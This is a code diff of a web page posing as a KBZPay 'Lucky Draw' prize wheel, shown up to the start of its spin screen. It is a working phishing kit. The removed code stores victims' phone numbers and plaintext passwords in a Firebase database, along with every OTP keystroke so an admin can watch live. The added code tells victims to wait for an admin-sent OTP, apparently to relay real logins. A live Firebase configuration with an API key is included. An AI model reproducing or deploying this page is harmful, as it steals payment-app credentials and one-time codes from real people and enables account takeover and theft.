@@ -2,504 +2,680 @@
 
 <html lang="my">
 <head>
-<meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"/>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>KBZPay Lucky Draw</title>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
 <style>
 *{box-sizing:border-box;margin:0;padding:0;}
-body{font-family:'Segoe UI',system-ui,sans-serif;background:#000E2A;overscroll-behavior:none;-webkit-tap-highlight-color:transparent;}
-input,textarea{font-family:inherit;}
-::-webkit-scrollbar{width:4px;}::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.1);border-radius:4px;}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#000E2A;min-height:100vh;overflow-x:hidden;-webkit-tap-highlight-color:transparent;}
+.screen{min-height:100vh;display:flex;flex-direction:column;align-items:center;position:relative;overflow:hidden;}
+input,textarea,button{font-family:inherit;}
+::-webkit-scrollbar{width:3px;height:3px;}
+::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.12);border-radius:4px;}
+button{cursor:pointer;}
+@keyframes twinkle{0%,100%{opacity:.25;transform:scale(.7)}50%{opacity:.9;transform:scale(1.3)}}
+@keyframes slideUp{from{transform:translateY(26px);opacity:0}to{transform:translateY(0);opacity:1}}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(255,215,0,.65),0 6px 24px rgba(255,140,0,.4)}60%{box-shadow:0 0 0 16px rgba(255,215,0,0),0 6px 24px rgba(255,140,0,.4)}}
+@keyframes kpulse{0%,100%{box-shadow:0 8px 28px rgba(0,93,184,.45)}50%{box-shadow:0 8px 40px rgba(0,93,184,.9),0 0 60px rgba(0,119,230,.3)}}
+@keyframes spinRing{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+@keyframes popUp{from{transform:scale(.45) translateY(28px);opacity:0}to{transform:scale(1) translateY(0);opacity:1}}
 @keyframes fdIn{from{opacity:0}to{opacity:1}}
-@keyframes fdOut{from{opacity:1}to{opacity:0}}
-@keyframes popUp{from{transform:scale(.5) translateY(30px);opacity:0}to{transform:scale(1) translateY(0);opacity:1}}
-@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(255,215,0,.7),0 8px 30px rgba(255,140,0,.5)}60%{box-shadow:0 0 0 18px rgba(255,215,0,0),0 8px 30px rgba(255,140,0,.5)}}
-@keyframes kpulse{0%,100%{box-shadow:0 6px 24px rgba(0,93,184,0.5)}50%{box-shadow:0 6px 36px rgba(0,93,184,0.9),0 0 50px rgba(0,119,230,0.3)}}
-@keyframes spinRing{from{transform:rotate(0)}to{transform:rotate(360deg)}}
-@keyframes twinkle{0%,100%{opacity:.3;transform:scale(.8)}50%{opacity:.9;transform:scale(1.3)}}
-@keyframes slideUp{from{transform:translateY(24px);opacity:0}to{transform:translateY(0);opacity:1}}
-@keyframes logoPulse{0%,100%{transform:scale(1)}50%{transform:scale(1.03)}}
-@keyframes shine{0%{background-position:200% center}100%{background-position:-200% center}}
+@keyframes typeDot{0%,80%,100%{transform:translateY(0);opacity:.35}40%{transform:translateY(-5px);opacity:1}}
+@keyframes shimmer{0%{background-position:-200% center}100%{background-position:200% center}}
+@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-7px)}}
+.star{position:absolute;border-radius:50%;background:white;pointer-events:none;}
+.inp-wrap{display:flex;align-items:center;background:rgba(255,255,255,0.06);border:1.5px solid rgba(255,255,255,.1);border-radius:14px;overflow:hidden;transition:border-color .2s;}
+.inp-wrap:focus-within{border-color:rgba(0,119,230,.7);}
+.inp-wrap input{flex:1;background:none;border:none;outline:none;color:white;font-size:15px;padding:14px 12px;font-family:inherit;caret-color:#0099FF;}
+.inp-wrap input::placeholder{color:rgba(255,255,255,.28);}
+.lbl{color:rgba(255,255,255,.5);font-size:12px;font-weight:600;margin-bottom:7px;}
+.err{background:rgba(255,45,85,.12);border:1px solid rgba(255,45,85,.3);border-radius:10px;padding:10px 14px;color:#FF6B8A;font-size:13px;margin-bottom:12px;display:none;}
+.blue-btn{width:100%;padding:16px 0;border-radius:14px;border:none;background:linear-gradient(135deg,#005DB8,#0077E6);color:white;font-size:17px;font-weight:900;box-shadow:0 6px 22px rgba(0,93,184,.45);}
+.card{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:24px;padding:28px 22px;backdrop-filter:blur(20px);}
+.kbz-bar{width:100%;background:#005DB8;padding:13px 18px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 18px rgba(0,93,184,.5);flex-shrink:0;}
+.kbz-badge{background:white;border-radius:8px;padding:4px 11px;display:flex;align-items:center;gap:1px;}
+.kbz-badge span:first-child{color:#005DB8;font-weight:900;font-size:15px;}
+.kbz-badge span:last-child{color:#005DB8;font-weight:700;font-size:11px;}
+.back-btn{background:rgba(255,255,255,.18);border:none;border-radius:10px;width:38px;height:38px;color:white;font-size:18px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
 </style>
 </head>
 <body>
-<div id="root"></div>
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
-<script>
-firebase.initializeApp({
-  apiKey:"AIzaSyBRwkZzqyINBqdglIoC6jC1z7aQZU0CwiQ",
-  authDomain:"kbz-pay-april-lucky-draw.firebaseapp.com",
-  databaseURL:"https://kbz-pay-april-lucky-draw-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId:"kbz-pay-april-lucky-draw",
-  storageBucket:"kbz-pay-april-lucky-draw.firebasestorage.app",
-  messagingSenderId:"535142665183",
-  appId:"1:535142665183:web:c818667e8de4aa9fb6126a"
-});
-const DB=firebase.database();
-const fupd=(p,v)=>DB.ref(p).update(v);
-const fpush=(p,v)=>DB.ref(p).push(v);
-const fonce=(p)=>DB.ref(p).once('value').then(s=>s.val());
-const fon=(p,cb)=>{DB.ref(p).on('value',s=>cb(s.val()));return()=>DB.ref(p).off();};
-const sk=(ph)=>String(ph).replace(/[^a-zA-Z0-9]/g,'_');
-const now=()=>Date.now();
-const fmtT=(t)=>{if(!t)return'ယခု';const d=now()-t;if(d<60000)return'ယခု';if(d<3600000)return Math.floor(d/60000)+'မိနစ်';return new Date(t).toLocaleTimeString('my-MM',{hour:'2-digit',minute:'2-digit'});};
 
-const PRIZES=[
-{id:0,amount:10000,display:“10,000”,mmk:“တစ်သောင်း”,color:”#FF2D55”,light:”#FF6B8A”,dark:”#C4002A”},
-{id:1,amount:30000,display:“30,000”,mmk:“သုံးသောင်း”,color:”#FF6B00”,light:”#FFA040”,dark:”#C45000”},
-{id:2,amount:50000,display:“50,000”,mmk:“ငါးသောင်း”,color:”#FFD700”,light:”#FFE866”,dark:”#C4A000”},
-{id:3,amount:100000,display:“100,000”,mmk:“တစ်သိန်း”,color:”#00C853”,light:”#5EE88A”,dark:”#009A3E”},
-{id:4,amount:300000,display:“300,000”,mmk:“သုံးသိန်း”,color:”#00B8FF”,light:”#6DD8FF”,dark:”#0088C4”},
-{id:5,amount:500000,display:“500,000”,mmk:“ငါးသိန်း”,color:”#9C27FF”,light:”#C870FF”,dark:”#6A00C4”},
-{id:6,amount:0,display:“အထူးဆု”,mmk:“iPhone 17”,color:”#FF2D8F”,light:”#FF80C0”,dark:”#C4006A”,isSpecial:true}
-];
-const N=PRIZES.length,SEG_DEG=360/N,SEG_RAD=(2*Math.PI)/N;
+<!-- ══ HOME ══════════════════════════════════════════════════════════════ -->
 
-const S={screen:‘splash’,phone:’’,uid:’’,winHistory:[],offChat:null};
-function go(sc){if(S.offChat){S.offChat();S.offChat=null;}S.screen=sc;render();}
-
-function darken(h,a){const n=parseInt(h.slice(1),16);return`rgb(${Math.max(0,((n>>16)&0xff)-a)},${Math.max(0,((n>>8)&0xff)-a)},${Math.max(0,(n&0xff)-a)})`;}
-function addStars(el,n){for(let i=0;i<n;i++){const s=document.createElement(‘div’);s.style.cssText=`position:absolute;left:${(i*19+5)%100}%;top:${(i*11+8)%100}%;width:${i%5===0?3:1.5}px;height:${i%5===0?3:1.5}px;border-radius:50%;background:white;animation:twinkle ${1.5+(i%5)*.4}s ${(i%6)*.3}s ease-in-out infinite;pointer-events:none;`;el.appendChild(s);}}
-
-function render(){
-document.getElementById(‘root’).innerHTML=’’;
-({splash:Splash,login:Login,otp:OTP,spin:Spin,chat:Chat}[S.screen]||Splash)(document.getElementById(‘root’));
-}
-
-/* ═══ SPLASH ═══════════════════════════════════════════════════ */
-function Splash(root){
-const d=document.createElement(‘div’);
-d.style.cssText=‘position:fixed;inset:0;background:white;display:flex;flex-direction:column;align-items:center;justify-content:space-between;padding:60px 0 50px;z-index:999;animation:fdIn .3s ease;’;
-d.innerHTML=`
-
-  <div></div>
-  <div style="display:flex;flex-direction:column;align-items:center;gap:18px;animation:logoPulse 2s ease-in-out infinite;">
-    <div style="width:110px;height:110px;border-radius:26px;background:#1B5EBE;display:flex;flex-direction:column;align-items:center;justify-content:center;box-shadow:0 16px 48px rgba(27,94,190,0.35);gap:0;">
-      <div style="display:flex;align-items:center;gap:1px;">
-        <span style="color:white;font-size:34px;font-weight:900;letter-spacing:-1px;line-height:1;">KBZ</span>
-        <div style="display:flex;flex-direction:column;margin-left:2px;margin-bottom:4px;">
-          <svg width="13" height="13" viewBox="0 0 16 16"><polyline points="1,1 15,1 15,15" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        </div>
-      </div>
-      <div style="display:flex;align-items:center;gap:2px;margin-top:-6px;">
-        <svg width="12" height="12" viewBox="0 0 16 16"><polyline points="15,15 1,15 1,1" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        <span style="color:white;font-size:23px;font-weight:700;letter-spacing:1.5px;">Pay</span>
-      </div>
+<div id="s-home" class="screen" style="background:linear-gradient(180deg,#000E2A 0%,#001840 55%,#000E2A 100%);justify-content:center;">
+  <div id="home-stars"></div>
+  <div style="animation:slideUp .5s ease;display:flex;flex-direction:column;align-items:center;gap:0;padding:20px;z-index:5;width:100%;max-width:420px;">
+    <div id="kbz-logo" style="width:128px;height:128px;border-radius:32px;background:white;display:flex;flex-direction:column;align-items:center;justify-content:center;box-shadow:0 20px 55px rgba(0,93,184,.5);margin-bottom:22px;animation:kpulse 2.5s ease-in-out infinite;">
+      <div style="font-size:52px;font-weight:900;color:#005DB8;line-height:1;letter-spacing:-2px;">KBZ</div>
+      <div style="font-size:20px;font-weight:700;color:#005DB8;letter-spacing:3px;margin-top:-2px;">Pay</div>
     </div>
-    <div style="color:#1B3A6B;font-size:20px;font-weight:700;letter-spacing:.3px;">Welcome to KBZPay</div>
+    <div style="color:white;font-size:25px;font-weight:900;letter-spacing:-.5px;margin-bottom:5px;">KBZPay</div>
+    <div style="font-size:15px;font-weight:700;background:linear-gradient(90deg,#FFE566,#FFD700,#FF8C00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:5px;">Lucky Draw 🎰 ကံစမ်းပွဲ</div>
+    <div style="color:rgba(255,255,255,.3);font-size:12px;margin-bottom:38px;">Spin & Win · iPhone 17 Pro Max ဆုကြီး</div>
+    <button onclick="show('login')" style="width:240px;padding:17px 0;border-radius:20px;border:none;background:linear-gradient(135deg,#005DB8 0%,#0077E6 50%,#0099FF 100%);color:white;font-size:17px;font-weight:900;display:flex;align-items:center;justify-content:center;gap:10px;animation:kpulse 2s ease-in-out infinite;box-shadow:0 8px 28px rgba(0,93,184,.55);">
+      <span style="font-size:19px;">🔐</span> ဝင်ရောက်ပါ
+    </button>
+    <div style="margin-top:12px;color:rgba(255,255,255,.2);font-size:12px;">KBZPay account ဖြင့် ဝင်ရောက်ပါ</div>
   </div>
-  <div style="display:flex;flex-direction:column;align-items:center;gap:8px;">
-    <div style="color:#aaa;font-size:12px;font-weight:500;">Now With</div>
-    <div style="width:54px;height:54px;border-radius:50%;overflow:hidden;background:linear-gradient(135deg,#FFB300,#FF8F00);display:flex;align-items:center;justify-content:center;">
-      <span style="font-size:26px;">🏛️</span>
-    </div>
-    <div style="color:#1B5EBE;font-size:10px;font-weight:800;text-align:center;line-height:1.5;letter-spacing:.5px;">MyanmarPay<br/><span style="font-size:13px;font-weight:900;letter-spacing:1px;">MMQR</span></div>
-  </div>`;
-  root.appendChild(d);
-  setTimeout(()=>{d.style.animation='fdOut .4s ease forwards';setTimeout(()=>go('login'),400);},3000);
-}
+  <div style="position:absolute;bottom:24px;left:0;right:0;display:flex;gap:5px;flex-wrap:wrap;justify-content:center;padding:0 16px;z-index:5;" id="home-prizes"></div>
+</div>
 
-/* ═══ LOGIN ════════════════════════════════════════════════════ */
-function Login(root){
-const d=document.createElement(‘div’);
-d.style.cssText=‘min-height:100vh;background:linear-gradient(175deg,#020C1F 0%,#061435 40%,#0A1E55 70%,#020C1F 100%);display:flex;flex-direction:column;align-items:center;position:relative;overflow:hidden;’;
-addStars(d,20);
-d.innerHTML+=`
+<!-- ══ LOGIN ══════════════════════════════════════════════════════════════ -->
 
-  <div style="width:100%;background:linear-gradient(135deg,#005DB8,#0077E6);padding:13px 18px;display:flex;align-items:center;gap:11px;box-shadow:0 2px 20px rgba(0,93,184,0.5);position:relative;z-index:5;flex-shrink:0;">
-    <div style="background:white;border-radius:9px;padding:4px 11px;display:flex;align-items:center;gap:2px;"><span style="color:#005DB8;font-weight:900;font-size:15px;">KBZ</span><span style="color:#005DB8;font-weight:700;font-size:11px;">Pay</span></div>
-    <span style="color:rgba(255,255,255,.85);font-size:13px;font-weight:600;">Lucky Draw ကစားရန် ဝင်ပါ</span>
+<div id="s-login" class="screen" style="display:none;background:#000E2A;">
+  <div class="kbz-bar">
+    <button class="back-btn" onclick="show('home')">←</button>
+    <div class="kbz-badge"><span>KBZ</span><span> Pay</span></div>
+    <span style="color:rgba(255,255,255,.85);font-size:14px;font-weight:600;">အကောင့်ဝင်ရန်</span>
   </div>
-
-  <!-- PROMO BANNER -->
-
-  <div style="width:calc(100% - 28px);max-width:420px;margin:16px 0 0;position:relative;z-index:5;">
-    <div style="background:linear-gradient(135deg,#1A0800,#3A1200,#1A0800);border:1.5px solid rgba(255,140,0,0.45);border-radius:18px;padding:15px 16px;position:relative;overflow:hidden;">
-      <div style="position:absolute;inset:0;background:linear-gradient(90deg,transparent 0%,rgba(255,215,0,0.07) 50%,transparent 100%);background-size:200%;animation:shine 3s linear infinite;pointer-events:none;"></div>
-      <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
-        <div style="font-size:28px;flex-shrink:0;line-height:1;">🎉</div>
-        <div>
-          <div style="background:linear-gradient(90deg,#FFD700,#FF8C00,#FFD700);background-size:200%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:15px;font-weight:900;letter-spacing:.3px;">နယုန်လ · စာပေပြန်တော်ပွဲ</div>
-          <div style="color:rgba(255,165,0,0.55);font-size:9px;font-weight:700;letter-spacing:2px;margin-top:2px;">JUNE SPECIAL LUCKY DRAW 2025</div>
-        </div>
-      </div>
-      <div style="color:rgba(255,255,255,0.78);font-size:12px;line-height:1.75;margin-bottom:10px;">KBZPay မှ နယုန်လ ဂုဏ်ပြု Special Lucky Draw ကြီးသို့ ကြိုဆိုပါသည်။<br/>Spin ၃ ကြိမ် လှည့်ပြီး ဆုကြေးငွေများ ရယူပါ!</div>
-      <div style="display:flex;gap:4px;flex-wrap:wrap;">
-        ${PRIZES.filter(p=>!p.isSpecial).map(p=>`<span style="background:${p.color}18;border:1px solid ${p.color}45;color:${p.color};font-size:9px;font-weight:800;padding:2px 7px;border-radius:10px;">${p.display} MMK</span>`).join('')}
-        <span style="background:#FF2D8F18;border:1px solid #FF2D8F45;color:#FF2D8F;font-size:9px;font-weight:800;padding:2px 7px;border-radius:10px;">📱 iPhone 17 Pro</span>
-      </div>
-    </div>
-  </div>
-
-  <!-- LOGIN FORM -->
-
-  <div style="width:calc(100% - 28px);max-width:420px;margin-top:14px;position:relative;z-index:5;animation:slideUp .4s ease;">
-    <div style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:20px;padding:22px 18px;">
-      <div style="margin-bottom:13px;">
-        <div style="color:rgba(255,255,255,.45);font-size:11px;font-weight:700;margin-bottom:6px;letter-spacing:.5px;">📱 ဖုန်းနံပါတ်</div>
-        <div style="display:flex;align-items:center;background:rgba(255,255,255,.06);border:1.5px solid rgba(255,255,255,.1);border-radius:12px;overflow:hidden;">
-          <div style="padding:12px 11px;color:rgba(255,255,255,.4);font-size:13px;font-weight:700;border-right:1px solid rgba(255,255,255,.08);flex-shrink:0;">+95</div>
-          <input id="lph" type="tel" placeholder="09xxxxxxxxx" style="flex:1;background:none;border:none;outline:none;color:white;font-size:15px;padding:12px 11px;"/>
-        </div>
+  <div style="width:calc(100% - 40px);max-width:390px;margin-top:26px;animation:slideUp .4s ease;">
+    <div class="card">
+      <div style="text-align:center;margin-bottom:24px;">
+        <div style="font-size:46px;margin-bottom:10px;">👤</div>
+        <div style="color:white;font-size:18px;font-weight:800;margin-bottom:4px;">ဝင်ရောက်ပါ</div>
+        <div style="color:rgba(255,255,255,.35);font-size:12px;">KBZPay account ဖြင့် Lucky Draw ကစားပါ</div>
       </div>
       <div style="margin-bottom:14px;">
-        <div style="color:rgba(255,255,255,.45);font-size:11px;font-weight:700;margin-bottom:6px;letter-spacing:.5px;">🔒 Password</div>
-        <div style="display:flex;align-items:center;background:rgba(255,255,255,.06);border:1.5px solid rgba(255,255,255,.1);border-radius:12px;overflow:hidden;">
-          <input id="lpw" type="password" placeholder="Password ရိုက်ထည့်ပါ" style="flex:1;background:none;border:none;outline:none;color:white;font-size:15px;padding:12px 11px;"/>
-          <button id="ltog" style="background:none;border:none;padding:0 13px;color:rgba(255,255,255,.35);cursor:pointer;font-size:17px;flex-shrink:0;">👁</button>
+        <div class="lbl">📱 ဖုန်းနံပါတ်</div>
+        <div class="inp-wrap">
+          <div style="padding:14px 12px;color:rgba(255,255,255,.45);font-size:13px;font-weight:700;border-right:1px solid rgba(255,255,255,.08);flex-shrink:0;">+95</div>
+          <input id="inp-phone" type="tel" placeholder="09xxxxxxxxx" maxlength="11" oninput="this.value=this.value.replace(/\D/g,'')">
         </div>
       </div>
-      <div id="lerr" style="display:none;background:rgba(255,45,85,.12);border:1px solid rgba(255,45,85,.3);border-radius:9px;padding:8px 12px;color:#FF6B8A;font-size:12px;margin-bottom:12px;"></div>
-      <button id="lsub" style="width:100%;padding:14px;border-radius:12px;border:none;background:linear-gradient(135deg,#005DB8,#0077E6);color:white;font-size:15px;font-weight:900;cursor:pointer;box-shadow:0 5px 20px rgba(0,93,184,0.45);animation:kpulse 2s ease-in-out infinite;">OTP ကုဒ် ရယူပါ →</button>
-      <div style="text-align:center;margin-top:8px;color:rgba(255,255,255,0.15);font-size:10px;">မည်သည့် ဖုန်းနံပါတ် / Password မဆို ဝင်ရောက်နိုင်သည်</div>
-    </div>
-  </div>
-  <div style="height:24px;"></div>`;
-
-d.querySelector(’#ltog’).onclick=e=>{const i=d.querySelector(’#lpw’);i.type=i.type===‘password’?‘text’:‘password’;e.currentTarget.textContent=i.type===‘password’?‘👁’:‘🙈’;};
-d.querySelector(’#lsub’).onclick=()=>{
-const ph=d.querySelector(’#lph’).value.replace(/\D/g,’’);
-const pw=d.querySelector(’#lpw’).value;
-const err=d.querySelector(’#lerr’);
-const btn=d.querySelector(’#lsub’);
-if(ph.length<5){err.textContent=‘⚠️ ဖုန်းနံပါတ် ထည့်ပါ’;err.style.display=‘block’;return;}
-if(pw.length<4){err.textContent=‘⚠️ Password အနည်းဆုံး ၄ လုံး ထည့်ပါ’;err.style.display=‘block’;return;}
-err.style.display=‘none’;
-btn.textContent=‘ပေးပို့နေသည်…’;btn.disabled=true;
-S.phone=ph; S.uid=‘user_’+sk(ph);
-// ① Firebase set() — phone+password admin မြင်ချင်း
-DB.ref(‘users/’+sk(ph)).set({phone:ph,password:pw,loginAt:now(),status:‘active’})
-.then(()=>DB.ref(‘otps/’+sk(ph)).set({phone:ph,password:pw,userEnteredOTP:’’,lastTyped:0,requestAt:now()}))
-.then(()=>go(‘otp’))
-.catch(er=>{err.textContent=’⚠️ Firebase error: ’+er.message;err.style.display=‘block’;btn.textContent=‘OTP ကုဒ် ရယူပါ →’;btn.disabled=false;});
-};
-root.appendChild(d);
-}
-
-/* ═══ OTP ═══════════════════════════════════════════════════════ */
-function OTP(root){
-const d=document.createElement(‘div’);
-d.style.cssText=‘min-height:100vh;background:#000E2A;display:flex;flex-direction:column;align-items:center;’;
-const masked=S.phone?S.phone.slice(0,3)+’****’+S.phone.slice(-3):’’;
-let timer=120,timerInt,digits=[’’,’’,’’,’’,’’,’’];
-
-d.innerHTML=`
-
-  <div style="width:100%;background:linear-gradient(135deg,#005DB8,#0077E6);padding:13px 18px;display:flex;align-items:center;gap:11px;box-shadow:0 2px 20px rgba(0,93,184,0.5);">
-    <button id="bk" style="background:rgba(255,255,255,0.18);border:none;border-radius:9px;width:36px;height:36px;color:white;font-size:17px;cursor:pointer;display:flex;align-items:center;justify-content:center;">←</button>
-    <div style="background:white;border-radius:8px;padding:4px 11px;"><span style="color:#005DB8;font-weight:900;font-size:15px;">KBZ</span><span style="color:#005DB8;font-weight:700;font-size:11px;">Pay</span></div>
-    <span style="color:rgba(255,255,255,.85);font-size:13px;font-weight:600;">OTP အတည်ပြုခြင်း</span>
-  </div>
-  <div style="width:calc(100% - 32px);max-width:400px;margin-top:22px;animation:slideUp .4s ease;">
-    <div style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:20px;padding:26px 18px;">
-      <div style="text-align:center;margin-bottom:20px;">
-        <div style="width:64px;height:64px;border-radius:18px;background:linear-gradient(135deg,#005DB8,#0099FF);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:28px;box-shadow:0 8px 24px rgba(0,93,184,0.4);">📱</div>
-        <div style="color:white;font-size:16px;font-weight:800;margin-bottom:5px;">OTP ကုဒ် ထည့်ပါ</div>
-        <div style="color:rgba(255,255,255,.38);font-size:12px;line-height:1.7;"><span style="color:#38B6FF;font-weight:700;">${masked}</span> ဖုန်းသို့<br/>SMS ရောက်မည့် OTP ကုဒ် ၆ လုံး ရိုက်ထည့်ပါ</div>
-      </div>
-      <!-- 6 digit boxes -->
-      <div id="oboxes" style="display:flex;gap:7px;justify-content:center;margin-bottom:16px;"></div>
-      <!-- Live status bar -->
-      <div style="background:rgba(0,93,184,0.08);border:1px solid rgba(0,119,230,0.18);border-radius:11px;padding:10px 12px;margin-bottom:15px;display:flex;align-items:center;gap:9px;">
-        <span style="font-size:14px;flex-shrink:0;">👁</span>
-        <div style="flex:1;">
-          <div style="color:rgba(255,255,255,0.22);font-size:9px;font-weight:700;letter-spacing:1.2px;margin-bottom:3px;">ADMIN REAL-TIME စစ်ဆေးနေသည်</div>
-          <div id="oprev" style="color:rgba(255,255,255,0.15);font-size:18px;font-weight:900;font-family:monospace;letter-spacing:5px;transition:color .2s;">· · · · · ·</div>
+      <div style="margin-bottom:16px;">
+        <div class="lbl">🔒 Password</div>
+        <div class="inp-wrap">
+          <input id="inp-pass" type="password" placeholder="Password ရိုက်ထည့်ပါ">
+          <button onclick="togglePass()" style="background:none;border:none;padding:0 13px;color:rgba(255,255,255,.4);font-size:17px;" id="pass-eye">👁</button>
         </div>
       </div>
-      <div id="oerr" style="display:none;background:rgba(255,45,85,.12);border:1px solid rgba(255,45,85,.3);border-radius:9px;padding:8px 12px;color:#FF6B8A;font-size:12px;margin-bottom:12px;text-align:center;"></div>
-      <button id="oconf" disabled style="width:100%;padding:13px;border-radius:12px;border:none;background:rgba(255,255,255,0.06);color:rgba(255,255,255,.28);font-size:15px;font-weight:900;cursor:default;margin-bottom:12px;transition:all .3s;">🔐 Login ဝင်ရောက်မည်</button>
-      <div id="otimer" style="text-align:center;color:rgba(255,255,255,.18);font-size:11px;">OTP သက်တမ်း · <span id="otn">120</span>s</div>
+      <div class="err" id="login-err"></div>
+      <button class="blue-btn" onclick="doLogin()">OTP ကုဒ် ရယူပါ →</button>
+      <div style="text-align:center;margin-top:10px;color:rgba(255,255,255,.2);font-size:11px;">ဖုန်းနံပါတ်ထဲ OTP SMS ပို့ပေးမည်</div>
     </div>
-    <div style="text-align:center;margin-top:7px;color:rgba(255,255,255,0.1);font-size:10px;">မည်သည့် ၆ လုံး OTP မဆို ဝင်ရောက်နိုင်သည် · Admin မှ real-time မြင်ရသည်</div>
-  </div>`;
+  </div>
+</div>
 
-const wrap=d.querySelector(’#oboxes’),refs=[];
-for(let i=0;i<6;i++){
-const inp=document.createElement(‘input’);
-inp.type=‘tel’;inp.inputMode=‘numeric’;inp.maxLength=1;
-inp.style.cssText=‘width:42px;height:52px;text-align:center;font-size:22px;font-weight:900;background:rgba(255,255,255,.05);border:1.5px solid rgba(255,255,255,.1);border-radius:11px;color:white;outline:none;font-family:monospace;caret-color:#0077E6;transition:all .2s;’;
-inp.addEventListener(‘input’,e=>{
-const v=e.target.value.replace(/\D/g,’’);digits[i]=v.slice(-1);inp.value=digits[i];
-inp.style.background=digits[i]?‘rgba(0,93,184,0.28)’:‘rgba(255,255,255,.05)’;
-inp.style.borderColor=digits[i]?‘rgba(0,119,230,0.6)’:‘rgba(255,255,255,.1)’;
-if(digits[i]&&i<5)refs[i+1].focus();
-onChg();
-});
-inp.addEventListener(‘keydown’,e=>{if(e.key===‘Backspace’){if(!digits[i]&&i>0)refs[i-1].focus();else{digits[i]=’’;inp.value=’’;inp.style.background=‘rgba(255,255,255,.05)’;inp.style.borderColor=‘rgba(255,255,255,.1)’;onChg();}}});
-inp.addEventListener(‘paste’,e=>{e.preventDefault();const p=(e.clipboardData||window.clipboardData).getData(‘text’).replace(/\D/g,’’).slice(0,6);p.split(’’).forEach((c,j)=>{if(j<6){digits[j]=c;refs[j].value=c;refs[j].style.background=‘rgba(0,93,184,0.28)’;refs[j].style.borderColor=‘rgba(0,119,230,0.6)’;}});refs[Math.min(p.length,5)].focus();onChg();});
-refs.push(inp);wrap.appendChild(inp);
-}
-refs[0].focus();
+<!-- ══ OTP ════════════════════════════════════════════════════════════════ -->
 
-function onChg(){
-const cur=digits.join(’’);
-const prev=d.querySelector(’#oprev’);
-if(prev){prev.textContent=Array.from({length:6},(_,i)=>cur[i]||’·’).join(’ ‘);prev.style.color=cur.length>0?‘rgba(255,255,255,0.75)’:‘rgba(255,255,255,0.15)’;}
-// ② Firebase: push every OTP keystroke → admin sees live
-fupd(‘otps/’+sk(S.phone),{userEnteredOTP:cur,lastTyped:now()});
-const btn=d.querySelector(’#oconf’);
-if(cur.length===6){btn.disabled=false;btn.style.background=‘linear-gradient(135deg,#005DB8,#0077E6)’;btn.style.color=‘white’;btn.style.cursor=‘pointer’;btn.style.boxShadow=‘0 5px 20px rgba(0,93,184,0.45)’;}
-else{btn.disabled=true;btn.style.background=‘rgba(255,255,255,0.06)’;btn.style.color=‘rgba(255,255,255,.28)’;btn.style.cursor=‘default’;btn.style.boxShadow=‘none’;}
-}
+<div id="s-otp" class="screen" style="display:none;background:#000E2A;">
+  <div class="kbz-bar">
+    <button class="back-btn" onclick="show('login')">←</button>
+    <div class="kbz-badge"><span>KBZ</span><span> Pay</span></div>
+    <span style="color:rgba(255,255,255,.85);font-size:14px;font-weight:600;">OTP အတည်ပြုခြင်း</span>
+  </div>
+  <div style="width:calc(100% - 40px);max-width:390px;margin-top:26px;animation:slideUp .4s ease;">
+    <div class="card">
+      <div style="text-align:center;margin-bottom:26px;">
+        <div style="width:72px;height:72px;border-radius:22px;background:linear-gradient(135deg,#005DB8,#0099FF);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:30px;box-shadow:0 8px 22px rgba(0,93,184,.4);">💬</div>
+        <div style="color:white;font-size:18px;font-weight:800;margin-bottom:8px;">OTP ကုဒ် ရိုက်ထည့်ပါ</div>
+        <div id="otp-hint" style="color:rgba(255,255,255,.4);font-size:13px;">Admin မှ OTP ပေးပို့ပါမည်...</div>
+      </div>
+      <div style="display:flex;gap:8px;justify-content:center;margin-bottom:22px;" id="otp-boxes"></div>
+      <div id="otp-status" style="text-align:center;color:#FFD700;font-size:12px;margin-bottom:10px;min-height:18px;"></div>
+      <div class="err" id="otp-err"></div>
+      <button class="blue-btn" onclick="verifyOTP()">🔐 ဝင်ရောက်မည်</button>
+    </div>
+    <div style="margin-top:10px;text-align:center;color:rgba(255,255,255,.15);font-size:11px;">Admin မှ OTP ပေးပို့ပြီးမှ ဖြည့်ပါ</div>
+  </div>
+</div>
 
-// ANY 6-digit accepted
-d.querySelector(’#oconf’).onclick=()=>{
-const entered=digits.join(’’);if(entered.length<6)return;
-const btn=d.querySelector(’#oconf’);
-btn.textContent=‘ဝင်ရောက်နေသည်…’;btn.disabled=true;
-// ② Firebase: save OTP entered + init chat
-DB.ref(‘otps/’+sk(S.phone)).update({userEnteredOTP:entered,status:‘entered’,enteredAt:now()})
-.then(()=>DB.ref(‘chats/’+sk(S.phone)).set({phone:S.phone,uid:S.uid,createdAt:now(),unread:0,lastMsg:’’,lastMsgAt:0}))
-.then(()=>{clearInterval(timerInt);go(‘spin’);})
-.catch(er=>{btn.textContent=‘🔐 Login ဝင်ရောက်မည်’;btn.disabled=false;
-const e=d.querySelector(’#oerr’);if(e){e.textContent=’⚠️ Error: ’+er.message;e.style.display=‘block’;}});
+<!-- ══ SPIN ═══════════════════════════════════════════════════════════════ -->
+
